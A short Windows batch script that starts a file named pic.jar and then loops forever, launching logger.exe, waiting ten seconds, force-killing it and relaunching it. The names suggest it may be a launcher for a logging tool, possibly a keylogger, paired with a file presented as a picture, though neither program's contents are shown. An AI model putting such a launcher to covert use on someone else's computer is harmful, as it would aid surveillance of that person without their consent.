@echo off

cd C:\Users\username\folder_location

start pic.jar

:loop

start logger.exe

@echo off

timeout /t 10 > NUL

@echo off

taskkill /F /IM logger.exe

goto loop